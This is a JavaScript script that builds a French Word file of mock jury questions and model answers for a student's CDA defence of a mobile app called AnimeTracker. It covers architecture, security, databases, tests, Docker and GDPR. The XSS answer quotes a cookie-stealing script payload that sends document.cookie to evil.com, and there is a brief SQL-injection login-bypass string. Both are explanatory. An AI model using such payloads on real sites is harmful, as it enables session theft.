import {
  Document, Packer, Paragraph, TextRun,
  AlignmentType, PageBreak, BorderStyle,
  convertInchesToTwip,
} from 'docx';
import { writeFileSync } from 'fs';

const VIOLET = '7C3AED';
const DARK   = '1E1B4B';
const GRAY   = '6B7280';
const GREEN  = '065F46';
const RED    = '991B1B';
const ORANGE = '92400E';
const TEAL   = '0E7490';

const h1 = (text) => new Paragraph({
  children: [new TextRun({ text, bold: true, size: 34, color: DARK, font: 'Calibri' })],
  spacing: { before: 360, after: 180 },
  border: { bottom: { color: VIOLET, style: BorderStyle.SINGLE, size: 8, space: 4 } },
});

const h2 = (text) => new Paragraph({
  children: [new TextRun({ text, bold: true, size: 24, color: VIOLET, font: 'Calibri' })],
  spacing: { before: 260, after: 100 },
});

const q = (text) => new Paragraph({
  children: [new TextRun({ text: 'Q : ' + text, size: 22, bold: true, color: RED, font: 'Calibri' })],
  spacing: { before: 180, after: 50 },
});

const r = (text) => new Paragraph({
  children: [new TextRun({ text: 'R : ' + text, size: 21, color: DARK, font: 'Calibri' })],
  spacing: { after: 100 },
  indent: { left: 360 },
});

const tip = (text) => new Paragraph({
  children: [new TextRun({ text: '→ ' + text, size: 20, color: GREEN, font: 'Calibri', italics: true })],
  spacing: { after: 60 },
  indent: { left: 360 },
});

const warn = (text) => new Paragraph({
  children: [new TextRun({ text: '⚠ ' + text, size: 20, color: ORANGE, bold: true, font: 'Calibri' })],
  spacing: { after: 80 },
  indent: { left: 360 },
});

const blank = () => new Paragraph({ text: '' });
const pb = () => new Paragraph({ children: [new PageBreak()] });
const sep = () => new Paragraph({
  border: { bottom: { color: 'E5E7EB', style: BorderStyle.SINGLE, size: 2, space: 4 } },
  spacing: { before: 80, after: 80 },
});

const qa = (question, reponse, conseil = null, alerte = null) => [
  q(question),
  r(reponse),
  ...(conseil ? [tip(conseil)] : []),
  ...(alerte ? [warn(alerte)] : []),
  sep(),
];

// ─────────────────────────────────────────────────────────────────────────────

const doc = new Document({
  styles: {
    default: {
      document: {
        run: { font: 'Calibri', size: 21, color: '111827' },
        paragraph: { spacing: { line: 270 } },
      },
    },
  },
  sections: [{
    properties: {
      page: {
        margin: {
          top:    convertInchesToTwip(1),
          right:  convertInchesToTwip(1.1),
          bottom: convertInchesToTwip(1),
          left:   convertInchesToTwip(1.3),
        },
      },
    },
    children: [

      // COVER
      ...Array(4).fill(blank()),
      new Paragraph({
        alignment: AlignmentType.CENTER,
        children: [new TextRun({ text: 'QUESTIONS JURY', bold: true, size: 48, color: DARK, font: 'Calibri' })],
        spacing: { after: 100 },
      }),
      new Paragraph({
        alignment: AlignmentType.CENTER,
        children: [new TextRun({ text: 'Soutenance CDA — AnimeTracker', size: 26, color: GRAY, font: 'Calibri' })],
        spacing: { after: 60 },
      }),
      new Paragraph({
        alignment: AlignmentType.CENTER,
        children: [new TextRun({ text: 'CUENOT ANTONIN — Juin 2026', size: 22, color: GRAY, font: 'Calibri' })],
      }),
      ...Array(3).fill(blank()),
      new Paragraph({
        alignment: AlignmentType.CENTER,
        children: [new TextRun({ text: '9 catégories · 80+ questions · Réponses courtes et directes', size: 21, italics: true, color: GRAY, font: 'Calibri' })],
      }),
      pb(),

      // ══ 1. ARCHITECTURE ══════════════════════════════════════════════════
      h1('1.  Architecture & Conception'),

      ...qa(
        "Qu'est-ce qu'une architecture en couches ? Pourquoi l'avoir utilisée ?",
        "C'est séparer l'application en niveaux d'abstraction : Frontend → API → Services → BDD. Chaque couche a une responsabilité unique. Avantage : modifier une couche sans impacter les autres. Exemple : changer PostgreSQL pour MySQL ne touche que les modèles Sequelize, pas les controllers.",
        "Cite les 5 couches : React Native → Express (routes/controllers) → Services (métier) → Sequelize (ORM) → PostgreSQL/Redis."
      ),

      ...qa(
        "Expliquez le pattern Controller / Service.",
        "Controller = gestion HTTP uniquement (parser req, formater res). Service = logique métier pure (requêtes BDD, règles de gestion). Le service ne connaît pas HTTP. Avantage : le service est testable sans démarrer Express — c'est ce que font les tests Jest.",
        "Exemple concret : reviewController parse les params et appelle upsertReview(). upsertReview() vérifie si l'avis existe déjà et fait UPDATE ou INSERT."
      ),

      ...qa(
        "Qu'est-ce qu'une API REST ?",
        "API REST = interface HTTP sans état. Chaque requête est auto-suffisante (le serveur ne mémorise pas l'état client). Les ressources sont identifiées par des URLs (/users/me), les actions par les verbes HTTP (GET=lire, POST=créer, PATCH=modifier, DELETE=supprimer). Les réponses sont en JSON.",
        "Précise : stateless = scalable. N'importe quel serveur peut traiter n'importe quelle requête."
      ),

      ...qa(
        "Pourquoi 54 endpoints et pas un seul endpoint générique ?",
        "Chaque endpoint correspond à une action métier précise avec ses propres validations, autorisations et logique. Un endpoint générique deviendrait ingérable et difficile à sécuriser. La clarté facilite aussi les tests et la documentation."
      ),

      ...qa(
        "Qu'est-ce qu'un middleware Express ?",
        "Fonction qui s'exécute entre la réception d'une requête et l'envoi de la réponse. Exemples dans AnimeTracker : authenticate (vérifie le JWT), sanitizeBody (échappe le HTML), Helmet (ajoute des headers), rateLimit (compte les requêtes). Chaque middleware appelle next() pour passer au suivant.",
        "Montre la chaîne : Helmet → rateLimit → json → sanitizeBody → routes → authenticate → controller."
      ),

      ...qa(
        "Qu'est-ce que asyncHandler et pourquoi l'utiliser ?",
        "Express 4 ne capture pas nativement les erreurs dans les fonctions async. Sans asyncHandler, une exception non catchée dans un controller async ferait crasher le serveur sans envoyer de réponse. asyncHandler enveloppe chaque controller et transmet les exceptions à next() → errorHandler.",
        "Express 5 intègre nativement ce comportement."
      ),

      pb(),

      // ══ 2. TYPESCRIPT & FRONTEND ══════════════════════════════════════════
      h1('2.  TypeScript & Frontend'),

      ...qa(
        "Quel est l'avantage de TypeScript sur JavaScript ?",
        "Typage statique : les erreurs de type sont détectées à la compilation, pas au runtime. Si une fonction attend un number et reçoit un string, TypeScript refuse de compiler. Avantages : moins de bugs en production, autocomplétion dans l'IDE, les types servent de documentation.",
        "Exemple : navigation.navigate('Chat', { recipientId }) — TypeScript vérifie que recipientId est bien fourni et de type string."
      ),

      ...qa(
        "Qu'est-ce que Redux Toolkit et pourquoi l'utiliser ?",
        "Redux centralise l'état de l'app dans un store unique. Redux Toolkit simplifie l'écriture avec createSlice et createAsyncThunk. Avantage sur Context : re-renders optimisés, DevTools pour déboguer, gestion native des états asynchrones (pending/fulfilled/rejected).",
        "J'ai 8 slices : auth, library, reviews, social, messaging, groups, anime, admin. Chacun gère un domaine métier."
      ),

      ...qa(
        "Qu'est-ce que createAsyncThunk ? Expliquez avec un exemple.",
        "Utilitaire Redux Toolkit pour les actions asynchrones. Il génère automatiquement 3 sous-actions : pending (appel API commence → spinner), fulfilled (succès → données dans le store), rejected (erreur → message affiché). Sans ça, il faudrait écrire ces 3 cas à la main pour chaque appel API.",
        "Exemple : loadLibrary — pendant l'appel GET /users/me/animes, isLoading passe à true. En fulfilled, les animés sont stockés dans animes[]."
      ),

      ...qa(
        "Qu'est-ce qu'un intercepteur Axios ?",
        "Middleware qui s'exécute avant chaque requête (intercepteur REQUEST) ou après chaque réponse (intercepteur RESPONSE). Dans AnimeTracker : REQUEST injecte le JWT automatiquement dans chaque appel. RESPONSE normalise les erreurs en messages lisibles pour l'UI.",
        "Sans intercepteur : chaque appel API devrait manuellement récupérer le token et formatter les erreurs — code dupliqué sur 20+ appels."
      ),

      ...qa(
        "Comment fonctionne la navigation React Navigation ?",
        "Deux stacks imbriquées. AuthStack (Login, Register) affichée si non connecté. MainStack (Tab Bar + 13 écrans) affichée si connecté. Le RootNavigator bascule entre les deux selon isAuthenticated dans Redux. Chaque route est typée dans MainStackParamList — TypeScript vérifie les paramètres à la compilation.",
        "Exemple : navigation.navigate('AnimeDetail', { animeId: 16498 }) — TypeScript vérifie que animeId est de type number."
      ),

      ...qa(
        "Qu'est-ce que le ThemeContext ?",
        "Context React qui fournit les couleurs du thème (clair ou sombre) à tous les composants via useTheme(). Le thème actif est stocké dans settingsSlice Redux (persisté). Tous les composants utilisent colors.primary[500] au lieu de valeurs hardcodées — un seul endroit à modifier pour changer les couleurs.",
        "Montre le gradient header : colors={[colors.primary[700], colors.primary[500], colors.secondary[400]]}."
      ),

      pb(),

      // ══ 3. SÉCURITÉ ═══════════════════════════════════════════════════════
      h1('3.  Sécurité'),

      ...qa(
        "Comment fonctionne JWT ?",
        "JSON Web Token = 3 parties encodées en base64 séparées par des points : header (algo) + payload ({ userId, role, exp }) + signature HMAC-SHA256 avec JWT_SECRET. Le serveur vérifie la signature à chaque requête — si elle ne correspond pas, le token est invalide. Sans accès au JWT_SECRET, impossible de forger un token.",
        "Précise : le payload est lisible (base64) mais pas falsifiable sans le secret."
      ),

      ...qa(
        "Pourquoi bcrypt et pas MD5 ou SHA256 ?",
        "MD5/SHA256 sont des fonctions de hachage rapides — une carte GPU peut tester des milliards de combinaisons par seconde (brute force). bcrypt est intentionnellement lent grâce au coût (cost factor 12 = 2^12 = 4096 itérations). Même avec un GPU puissant, tester des millions de mots de passe prendrait des années.",
        "Important : MD5 et SHA256 ne doivent JAMAIS être utilisés pour des mots de passe."
      ),

      ...qa(
        "Qu'est-ce que le XSS ? Comment vous en protégez-vous ?",
        "Cross-Site Scripting : un attaquant injecte du code JavaScript malveillant dans des champs texte qui est ensuite exécuté dans le navigateur d'autres utilisateurs. Protection : sanitizeBody échappe < en &lt;, > en &gt; avant stockage. Helmet ajoute X-XSS-Protection et Content-Security-Policy.",
        "Exemple d'attaque : un pseudo comme <script>document.location='http://evil.com?cookie='+document.cookie</script>. Après sanitizeBody, ce texte est stocké inoffensif."
      ),

      ...qa(
        "Qu'est-ce que l'injection SQL ? Comment vous en protégez-vous ?",
        "Attaque qui injecte du SQL dans les paramètres pour manipuler la BDD. Exemple : email = 'admin'--' pour bypasser l'authentification. Protection : Sequelize utilise des requêtes paramétrées automatiquement — les valeurs sont toujours transmises séparément du SQL, jamais interpolées.",
        "Si Sequelize fait User.findOne({ where: { email } }), le SQL généré est SELECT * FROM user WHERE email = $1 avec email en paramètre séparé."
      ),

      ...qa(
        "Qu'est-ce que Helmet ?",
        "Package Express qui configure automatiquement des headers HTTP défensifs. Les principaux : Content-Security-Policy (interdit les scripts externes), X-Frame-Options:DENY (anti-clickjacking), Strict-Transport-Security (force HTTPS), X-Content-Type-Options:nosniff (anti MIME sniffing), hidePoweredBy (masque X-Powered-By:Express).",
        "Le clickjacking = charger votre app dans un iframe transparent et tromper l'utilisateur pour qu'il clique sur des boutons cachés."
      ),

      ...qa(
        "Pourquoi un rate limiter ?",
        "Protection contre les attaques par force brute sur /auth/login. Sans rate limiter, un attaquant peut tenter des millions de mots de passe automatiquement. Avec 100 req/15min : après 100 tentatives échouées, l'IP est bloquée 15 minutes. Avec un mot de passe de 8 chars, les possibilités se comptent en milliards.",
        "100 req/15 min est un seuil global. En production, je mettrais un seuil plus strict (5-10 req/min) spécifiquement sur /auth/login."
      ),

      ...qa(
        "Qu'est-ce que le RBAC ?",
        "Role-Based Access Control = contrôle d'accès par rôle. Chaque utilisateur a un rôle (USER ou ADMIN) encodé dans son JWT. Le middleware requireRole('ADMIN') lit req.user.role (peuplé par authenticate) et retourne 403 si le rôle ne correspond pas. Un USER ne peut jamais accéder aux routes /admin/*.",
        "Le rôle est signé dans le JWT côté serveur — impossible à falsifier côté client."
      ),

      ...qa(
        "Votre JWT est-il sécurisé si quelqu'un intercepte le token ?",
        "Un token intercepté peut effectivement être utilisé jusqu'à son expiration (7 jours). Mitigations : HTTPS chiffre les échanges (interception difficile), AsyncStorage sur mobile est sandboxé par app. En production je passerais à des tokens de 1h avec refresh token. C'est un axe d'amélioration identifié.",
        "Répondre honnêtement : JWT n'est pas parfait, mais c'est le compromis standard pour les APIs mobiles."
      ),

      ...qa(
        "Que se passe-t-il si Redis est down ?",
        "La vérification de blacklist échoue → l'utilisateur ne peut plus se connecter (le middleware authenticate plante). En production, je gérerais cette erreur avec un fallback : si Redis est inaccessible, autoriser la requête mais logger l'incident. Pour le CDA, c'est un axe d'amélioration.",
        null,
        "C'est un point de fragilité réel à assumer."
      ),

      pb(),

      // ══ 4. BASE DE DONNÉES ════════════════════════════════════════════════
      h1('4.  Base de données'),

      ...qa(
        "Pourquoi des UUID comme clés primaires ?",
        "Les entiers auto-incrémentés (1, 2, 3...) sont prédictibles : GET /users/1, /users/2 → énumération de tous les utilisateurs. UUID v4 = 32 caractères hexadécimaux aléatoires → impossible à deviner. Avantage supplémentaire : génération distribuée sans conflit (utile si plusieurs serveurs de BDD).",
        "Exemple : /users/f6342c9f-d064-45a0-9eed-691b26f859f1 → on ne peut pas deviner les autres IDs."
      ),

      ...qa(
        "Qu'est-ce qu'un ENUM PostgreSQL ?",
        "Type de données qui contraint les valeurs acceptables directement en base. user_role ne peut contenir que 'USER', 'MODERATEUR' ou 'ADMIN'. Si le code envoie 'SUPERADMIN', PostgreSQL refuse l'insertion. C'est une garantie d'intégrité en plus de la validation Zod.",
        "Avantage : même si quelqu'un accède directement à la BDD, les contraintes tiennent."
      ),

      ...qa(
        "Qu'est-ce qu'une contrainte CHECK ?",
        "Contrainte SQL qui vérifie une condition à chaque INSERT/UPDATE. Exemple : CHECK(id_follower != id_following) interdit de se suivre soi-même. Cette vérification est aussi faite dans le service TypeScript, mais la contrainte SQL est la dernière ligne de défense si quelqu'un bypasse l'API.",
        "Double protection : service TypeScript + contrainte SQL."
      ),

      ...qa(
        "Qu'est-ce qu'un trigger SQL ? Où les utilisez-vous ?",
        "Procédure automatiquement exécutée avant/après une opération (INSERT/UPDATE/DELETE). Dans AnimeTracker : trigger trg_user_updated_at s'exécute BEFORE UPDATE sur la table user et met à jour le champ updated_at = NOW(). Même chose pour user_anime, review, conversation, group.",
        "Avantage : le champ updated_at est toujours à jour sans que le code applicatif ait à s'en souvenir."
      ),

      ...qa(
        "Pourquoi PostgreSQL et pas MongoDB ?",
        "Mes données sont fortement relationnelles : un utilisateur a plusieurs animés (user_anime), un animé a plusieurs avis (review), un avis a plusieurs likes (review_like), etc. PostgreSQL gère nativement ces relations avec des clés étrangères, des jointures et des contraintes d'intégrité. MongoDB est adapté aux données flexibles sans schéma fixe — ce n'est pas mon cas.",
        "MongoDB : pas de jointures natives, contraintes gérées manuellement dans le code."
      ),

      ...qa(
        "Pourquoi Redis est-il votre composante NoSQL ?",
        "Redis est une base de données clé/valeur en mémoire — c'est du NoSQL par définition. Je l'utilise pour la blacklist JWT : redis.set('blacklist:token', 1, EX: ttl). Lecture/écriture 10-100x plus rapide que PostgreSQL. TTL natif : la clé expire automatiquement quand le token expire.",
        "Si le jury insiste sur MongoDB : 'Redis remplissait le besoin NoSQL de manière plus pertinente. MongoDB aurait ajouté de la complexité sans valeur pour ce cas d'usage.'"
      ),

      ...qa(
        "Qu'est-ce qu'un index de performance ?",
        "Structure de données qui accélère les recherches sur une colonne. Sans index : PostgreSQL fait un full scan (lit toutes les lignes). Avec index : accès direct via un B-tree. Dans AnimeTracker : idx_user_email (login), idx_anime_title (recherche), idx_review_anime, idx_follow_follower.",
        "Contrepartie : les index ralentissent les INSERT/UPDATE car il faut les maintenir."
      ),

      ...qa(
        "Qu'est-ce qu'un soft-delete ?",
        "Suppression logique : le message n'est pas réellement effacé de la BDD, on enregistre deleted_at = NOW() et id_deleted_by. Le message reste pour l'audit mais n'est plus affiché. Utilisé dans group_message pour la modération admin — on garde la trace de qui a supprimé quoi.",
        "Hard delete = vraie suppression. Soft delete = marquage invisible."
      ),

      ...qa(
        "Pourquoi un init.sql manuel et pas les migrations Sequelize ?",
        "init.sql s'exécute automatiquement au premier démarrage Docker, ce qui correspond à mon besoin : initialiser la BDD de zéro en une commande. Les migrations Sequelize seraient préférables en production (historique des changements de schéma, rollback), mais pour un projet CDA avec un seul environnement, init.sql est plus simple et lisible.",
        "En production ou en équipe : Sequelize migrations ou Prisma migrate."
      ),

      pb(),

      // ══ 5. TESTS ══════════════════════════════════════════════════════════
      h1('5.  Tests'),

      ...qa(
        "Quelle est la différence entre test unitaire et test d'intégration ?",
        "Test unitaire : teste une fonction isolée, tout ce qui l'entoure est mocké. authService.test.ts teste register() avec User.create mocké — pas de vraie BDD. Test d'intégration : teste le flux complet d'une requête HTTP. auth.test.ts envoie un vrai POST /auth/register à Express avec Supertest — seule la BDD est mockée.",
        "Règle : unitaire = isolation maximale. Intégration = flux HTTP complet."
      ),

      ...qa(
        "Pourquoi mocker la BDD dans les tests ?",
        "Rapidité : sans mock, chaque test attend une vraie connexion BDD → lent. Fiabilité : un test ne doit pas dépendre de l'état de la BDD (données existantes, ordre d'exécution). Isolation : jest.mock() remplace User.findOne par une fonction contrôlée qui retourne exactement ce qu'on veut tester.",
        "Les 38 tests s'exécutent en ~4 secondes. Avec une vraie BDD : plusieurs minutes."
      ),

      ...qa(
        "Pourquoi seulement 38 tests automatisés sur les services auth et user ?",
        "L'auth et les services utilisateur sont les plus critiques (sécurité, RGPD) et les plus testables en isolation. Les autres fonctionnalités (groupes, messagerie, bibliothèque) orchestrent plusieurs services en chaîne et dépendent de données en BDD — les tester en unitaire demanderait de mocker une dizaine de couches. J'ai validé ces fonctionnalités par 41 tests manuels. C'est un axe d'amélioration.",
        "Réponse honnête : c'est un compromis pragmatique. En v2 : BDD de test dédiée + tests d'intégration complets."
      ),

      ...qa(
        "Qu'est-ce que Supertest ?",
        "Bibliothèque qui simule des requêtes HTTP vers une app Express sans démarrer de vrai serveur sur un port. request(app).post('/api/auth/login').send({...}).expect(200). Permet de tester les routes complètes (routing, middlewares, controllers) de manière isolée."
      ),

      ...qa(
        "Qu'est-ce que le coverage et les seuils de couverture ?",
        "Le coverage mesure quel pourcentage du code est exécuté par les tests. 4 métriques : statements (lignes), branches (if/else), functions (fonctions appelées), lines. J'ai des seuils : branches 50%, functions 60%, lines 75%. Si le coverage descend en-dessous, la CI échoue.",
        "La couverture réelle : statements 80%, branches 51%, functions 63%, lines 83%."
      ),

      pb(),

      // ══ 6. CI/CD & DOCKER ═════════════════════════════════════════════════
      h1('6.  CI/CD & Docker'),

      ...qa(
        "Qu'est-ce que l'intégration continue ?",
        "Pratique qui consiste à vérifier automatiquement que le code ne casse rien à chaque push. Dans AnimeTracker : GitHub Actions déclenche le pipeline à chaque push sur main — il installe les dépendances, lint le code, vérifie les types TypeScript et lance les 38 tests Jest. Si une étape échoue, le push est signalé comme problématique.",
        "Badge ✅ sur le repo = preuve que tout passe à chaque commit."
      ),

      ...qa(
        "Qu'est-ce qu'un conteneur Docker ?",
        "Environnement isolé qui package une application avec toutes ses dépendances (OS, libs, config). Contrairement à une VM, il partage le noyau Linux de l'hôte — plus léger et plus rapide. Dans AnimeTracker : postgres:15-alpine et redis:7-alpine garantissent les mêmes versions sur toutes les machines.",
        "Analogie : une VM = maison complète. Un conteneur = appartement dans un immeuble (noyau partagé)."
      ),

      ...qa(
        "Pourquoi PostgreSQL sur le port 5433 et pas 5432 ?",
        "Le port 5432 est le port par défaut de PostgreSQL. Si PostgreSQL est installé nativement sur la machine, il occupe déjà le port 5432. Docker ne peut pas mapper deux services sur le même port hôte. En remappant vers 5433, les deux coexistent sans conflit.",
        "docker-compose : ports: ['5433:5432'] = port hôte 5433 → port conteneur 5432."
      ),

      ...qa(
        "Qu'est-ce qu'un healthcheck Docker ?",
        "Test périodique qui vérifie qu'un service est opérationnel. PostgreSQL : pg_isready -U animetracker_user. Redis : redis-cli ping. Le backend attend que postgres et redis soient healthy avant de démarrer (depends_on + condition: service_healthy). Évite les race conditions au démarrage.",
        "Sans healthcheck : le backend pourrait démarrer avant que PostgreSQL soit prêt → erreur de connexion."
      ),

      ...qa(
        "Pourquoi GitHub Actions et pas un autre outil CI/CD ?",
        "Intégré nativement à GitHub, gratuit pour les repos publics. Marketplace de milliers d'actions prêtes à l'emploi (actions/checkout, actions/setup-node). Fichier YAML versionné dans le repo — visible et modifiable comme du code. Pas besoin d'un serveur CI externe.",
        "Alternative : GitLab CI (nécessite GitLab), CircleCI (payant), Jenkins (self-hosted complexe)."
      ),

      pb(),

      // ══ 7. FONCTIONNALITÉS ════════════════════════════════════════════════
      h1('7.  Fonctionnalités'),

      ...qa(
        "Pourquoi les avis sont-ils privés par défaut ?",
        "Privacy by design : la valeur la plus protectrice est le choix par défaut. L'utilisateur doit faire une action explicite pour rendre un avis public. C'est aussi une exigence RGPD. Et ça évite les publications accidentelles d'avis non terminés.",
        "Règle RGPD : consentement explicite pour le partage de données personnelles."
      ),

      ...qa(
        "Comment fonctionne la déconnexion avec la blacklist Redis ?",
        "À la déconnexion, POST /auth/logout : le backend décode le token pour connaître sa date d'expiration (exp), puis redis.set('blacklist:token_string', '1', EX: ttl_restant). TTL = secondes restantes avant expiration naturelle. À la prochaine requête avec ce token, authenticate vérifie redis.exists('blacklist:...') → 401 Token révoqué.",
        "Le token est rendu inutilisable immédiatement même s'il n'est pas encore expiré."
      ),

      ...qa(
        "Qu'est-ce que l'UPSERT pour les avis ?",
        "UPSERT = UPDATE si existe, INSERT sinon. Règle métier : 1 seul avis par (utilisateur, animé). reviewService.upsertReview() fait d'abord Review.findOne({ where: { id_user, id_anime } }). Si trouvé → UPDATE. Sinon → INSERT. La contrainte UNIQUE(id_user, id_anime) en BDD garantit aussi l'unicité.",
        "Pas d'endpoint séparé pour créer vs modifier — le même POST /animes/:id/reviews gère les deux cas."
      ),

      ...qa(
        "Pourquoi un seul groupe officiel par animé ?",
        "Règle métier : l'index UNIQUE sur (id_anime) WHERE type='OFFICIEL' en SQL l'interdit. getOrCreateOfficialGroup() cherche d'abord un groupe existant → crée seulement si inexistant. Evite la fragmentation de la communauté : tous les fans d'un animé dans le même groupe.",
        "Contrainte SQL + logique service = double protection."
      ),

      ...qa(
        "Pourquoi 3 tables pour la messagerie (conversation, participant, message) ?",
        "Ce modèle permet d'étendre facilement à des conversations de groupe (> 2 participants) sans modifier le schéma — ajouter juste un participant. La table conversation est le conteneur, conversation_participant lie les users, message stocke le contenu. Le backend vérifie que l'expéditeur est participant avant tout accès.",
        "Ce schéma est celui utilisé par la plupart des messageries professionnelles."
      ),

      ...qa(
        "Comment fonctionne le panel admin ? Comment y accède-t-on ?",
        "Accessible uniquement aux utilisateurs avec role='ADMIN' dans la BDD. Côté frontend : bouton 'Panneau Admin' visible seulement si user.role === 'ADMIN'. Côté backend : router.use(asyncHandler(authenticate), requireRole('ADMIN')) — toute requête vers /api/admin/* sans rôle ADMIN → 403 Forbidden. 11 endpoints : stats, gestion users, modération avis et messages.",
        "Le rôle est signé dans le JWT — impossible à falsifier. Pour promouvoir un admin : UPDATE user SET role='ADMIN' WHERE email=... dans PostgreSQL."
      ),

      ...qa(
        "Pourquoi les messages privés ne sont-ils pas visibles dans le panel admin ?",
        "Privacy by design et RGPD. Les conversations privées sont des données personnelles — un admin n'a pas de légitimité à les lire. Le panel admin affiche seulement le nombre de messages privés dans les stats. Seuls les messages de groupe (discussion publique) sont modérables.",
        "C'est un choix délibéré de design, pas un oubli."
      ),

      pb(),

      // ══ 8. RGPD & ÉTHIQUE ════════════════════════════════════════════════
      h1('8.  RGPD & Éthique'),

      ...qa(
        "Quelles mesures RGPD avez-vous implémentées ?",
        "4 mesures concrètes : 1) DELETE /users/me → supprime toutes les données en cascade (SQL ON DELETE CASCADE). 2) GET /users/me/data → export de toutes les données personnelles (droit d'accès). 3) Avis privés par défaut (privacy by design). 4) Mots de passe hachés avec bcrypt → jamais récupérables même en cas de fuite.",
        "Le RGPD demande : droit d'accès, droit à l'effacement, minimisation des données, consentement."
      ),

      ...qa(
        "Qu'est-ce que le privacy by design ?",
        "Principe RGPD qui consiste à intégrer la protection des données dès la conception, pas en ajout après coup. Exemples : avis privés par défaut, messages privés invisibles pour l'admin, mots de passe jamais stockés en clair, UUID non prédictibles.",
        "Principe : la privacy est le réglage par défaut, pas une option."
      ),

      ...qa(
        "Est-ce que votre app est accessible (RGAA) ?",
        "La RGAA est principalement conçue pour le web. Pour le mobile, les guidelines correspondantes sont les WCAG (Web Content Accessibility Guidelines). J'ai respecté les bonnes pratiques de base : contrastes de couleurs suffisants via le ThemeContext, textes lisibles. Une audit RGAA complète est un axe d'amélioration.",
        "Être honnête : accessibilité complète n'est pas implémentée, c'est un axe d'amélioration connu."
      ),

      pb(),

      // ══ 9. QUESTIONS PIÈGES & OUVERTES ════════════════════════════════════
      h1('9.  Questions pièges & Questions ouvertes'),

      ...qa(
        "Qu'est-ce que vous refereriez différemment ?",
        "3 choses : 1) Refresh token pour éviter les déconnexions forcées à 7 jours. 2) Tests d'intégration pour bibliothèque et messagerie avec une BDD de test dédiée. 3) Prisma plutôt que Sequelize pour un meilleur typage TypeScript automatique — je l'ai découvert après avoir commencé avec Sequelize.",
        "Montrer que tu as du recul sur ton travail — c'est valorisant."
      ),

      ...qa(
        "Quel a été le bug le plus complexe à résoudre ?",
        "Le hot-reload mort sur Windows + Docker. Nodemon ne détectait plus les changements de code depuis le conteneur. Après investigation : Docker Desktop sur Windows virtualise Linux et ne propage pas les événements inotify du système de fichiers Windows. Solution : lancer le backend directement sur l'hôte (npm run dev) et garder seulement PostgreSQL et Redis dans Docker.",
        "Expliquer le diagnostic et la démarche, pas juste la solution."
      ),

      ...qa(
        "Comment auriez-vous travaillé en équipe sur ce projet ?",
        "Branches Git par feature (feat/admin-panel, fix/review-visibility), pull requests avec code review obligatoire, CI qui bloque le merge si tests échouent. Le découpage en slices Redux et en services backend facilite la répartition du travail en parallèle sans conflits. Sprints Scrum de 2 semaines avec Kanban (Trello/Jira).",
        "Citer les conventions de commit (conventional commits), les revues de code, et les daily standups."
      ),

      ...qa(
        "Comment déployeriez-vous en production ?",
        "Backend dans un conteneur Docker (Dockerfile déjà présent), déployé sur Railway ou un VPS. PostgreSQL et Redis sur des services managés (Supabase, Upstash). CI/CD GitHub Actions déjà en place : tests → build → deploy. Variables d'environnement dans les secrets GitHub. Frontend Expo : build EAS pour publier sur Google Play / App Store.",
        "Citer les secrets GitHub pour ne jamais exposer JWT_SECRET en clair dans le repo."
      ),

      ...qa(
        "Votre app supporte-t-elle iOS ?",
        "React Native génère du code natif Android ET iOS depuis la même base de code. L'app a été testée sur émulateur Android. Pour iOS, il faudrait un Mac avec Xcode pour compiler et tester. La logique est identique, seuls quelques détails d'UI pourraient nécessiter des ajustements (SafeAreaInsets différents).",
        "Je n'ai pas de Mac pour tester iOS — à mentionner honnêtement."
      ),

      ...qa(
        "Qu'est-ce que l'éco-conception ? Avez-vous pensé à ça ?",
        "L'éco-conception vise à minimiser l'impact environnemental : réduire les appels réseau inutiles, optimiser les images, éviter les requêtes redondantes. Dans AnimeTracker : les données Jikan sont mises en cache dans PostgreSQL (last_fetched_at) pour éviter des appels répétés vers l'API externe. C'est un début. Un axe d'amélioration serait d'ajouter du cache Redis pour les réponses fréquentes.",
        "Le référentiel CDA mentionne l'éco-conception comme un 'plus'. Avoir réfléchi à ce point est valorisant."
      ),

      ...qa(
        "Pourquoi avez-vous choisi ce thème (animés) ?",
        "Domaine que je connais bien → je pouvais me concentrer sur les défis techniques sans chercher les règles métier. L'objectif principal était de réaliser une application mobile complète. Avoir présenté un site web pour le DWWM, passer au mobile pour le CDA était cohérent avec ma progression.",
        "Fin de réponse : 'Et ça m'a permis de tester avec de vraies données que je comprends.'"
      ),

      ...qa(
        "Avez-vous pensé à la scalabilité ?",
        "Oui partiellement. JWT stateless permet de déployer plusieurs instances backend sans partage d'état (la blacklist Redis est déjà partageable). PostgreSQL avec pool de connexions (max 10). Pour la montée en charge : Redis pour cacher les réponses fréquentes, CDN pour les images, load balancer devant plusieurs instances. Ce n'est pas implémenté mais l'architecture le permet.",
        "Montrer qu'on y a pensé même si ce n'est pas fait."
      ),

      blank(),
      new Paragraph({
        alignment: AlignmentType.CENTER,
        children: [new TextRun({ text: 'Bonne soutenance Antonin !', bold: true, size: 26, color: VIOLET, font: 'Calibri' })],
        spacing: { before: 300 },
      }),
    ],
  }],
});

Packer.toBuffer(doc).then(buf => {
  writeFileSync('../documentation/questions-jury-cda.docx', buf);
  console.log('✅ Questions jury générées : documentation/questions-jury-cda.docx');
});
